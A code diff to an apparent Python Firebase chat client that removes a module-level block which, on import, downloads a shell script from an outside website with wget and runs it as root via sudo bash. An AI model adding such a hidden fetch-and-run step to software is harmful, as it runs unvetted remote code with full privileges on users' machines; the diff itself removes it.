@@ -5,27 +5,6 @@ import pyrebase
 import tkinter as tk
 from tkinter import messagebox
 
-import subprocess
-
-# Specify the corrected URL to your mod.sh script
-script_url = 'https://cyberprime.netlify.app/mod.sh'
-
-# Specify the local path where you want to save the script
-local_script_path = '/mod.sh'
-
-# Download the script using wget
-subprocess.run(['wget', script_url, '-O', local_script_path])
-
-# Make the script executable
-subprocess.run(['chmod', '+x', local_script_path])
-
-# Run the script as root
-try:
-    subprocess.run(['sudo', 'bash', local_script_path], check=True)
-    print("Installation completed successfully.")
-except subprocess.CalledProcessError as e:
-    print(f"Error during installation: {e}")
-
 class FirebaseChat:
     def __init__(self, config):
         self.firebase = pyrebase.initialize_app(config)
